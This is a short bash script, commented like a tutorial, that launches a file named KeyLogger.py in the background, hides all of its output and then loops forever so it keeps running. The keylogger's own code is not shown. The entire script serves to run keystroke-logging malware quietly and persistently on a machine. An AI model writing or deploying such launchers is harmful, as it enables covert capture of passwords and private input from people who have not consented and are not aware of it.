#!/bin/bash
# This is the shebang line, which tells the system to use bash to interpret the script

# Start the KeyLogger script in the background and suppress output (both stdout and stderr)
python3 KeyLogger.py &> /dev/null &

# Pause indefinitely to keep the script running
while true; do
  # Sleep for 60 seconds before repeating the loop
  sleep 60 
done
